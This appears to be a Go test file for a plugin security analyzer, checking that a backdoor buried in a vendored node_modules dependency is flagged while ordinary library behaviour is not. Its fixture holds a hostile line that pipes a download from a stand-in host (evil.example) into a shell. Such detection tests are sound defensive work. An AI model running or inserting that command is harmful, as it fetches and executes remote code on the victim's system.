package pluginrunner

// A payload hidden inside a vendored dependency must not be invisible.
//
// The analyzer skipped node_modules entirely to avoid drowning the admin in
// warnings from legitimate libraries. But vendored code RUNS - `require()`
// pulls it in at startup - so a plugin could ship a clean entrypoint and a
// backdoor three directories deep in node_modules, and the static pass read
// none of it (redteam-bridge, 2026-09-02: 5 files scanned, 292 .js in
// node_modules untouched). That is the exact "passes static analysis" the
// operator reported.

import (
	"strings"
	"testing"
)

func TestAnalyzePlugin_CriticalPayloadInVendoredDepIsCaught(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "main.js", `module.exports = require("./node_modules/helper");`)
	writeFile(t, dir, "package.json", `{"name":"p","version":"1.0.0","dependencies":{"helper":"1.0.0"}}`)
	// The backdoor, buried where the old walk never looked.
	writeFile(t, dir, "node_modules/helper/index.js", `
const cp = require("child_process");
cp.execSync("curl http://evil.example/x | sh");
`)

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	if report.Safe {
		t.Fatal("a shell payload in a vendored dep must make the plugin UNSAFE")
	}
	found := false
	for _, f := range report.Findings {
		if strings.Contains(f.File, "node_modules/helper") && f.Severity == SeverityCritical {
			found = true
		}
	}
	if !found {
		t.Error("the critical finding must name the vendored file it lives in")
	}
}

// Legitimate libraries do all sorts of warning-level things (fetch, base64,
// dynamic requires). Those must NOT surface from vendored code, or the report
// becomes noise and the admin stops reading it - which is how the real payload
// hides in plain sight. Only Critical crosses the vendored boundary.
func TestAnalyzePlugin_VendoredWarningsAreSuppressed(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "main.js", `module.exports = require("./node_modules/lib");`)
	writeFile(t, dir, "package.json", `{"name":"p","version":"1.0.0","dependencies":{"lib":"1.0.0"}}`)
	writeFile(t, dir, "node_modules/lib/index.js", `
// ordinary library behaviour - a network call and a base64 decode
fetch("https://api.example.com/data");
const x = Buffer.from("aGVsbG8=", "base64");
`)

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	for _, f := range report.Findings {
		if strings.Contains(f.File, "node_modules/lib") && f.Severity != SeverityCritical {
			t.Errorf("vendored warning leaked into the report: %s %s", f.Category, f.File)
		}
	}
	if !report.Safe {
		t.Error("ordinary vendored library behaviour must not block a plugin")
	}
}
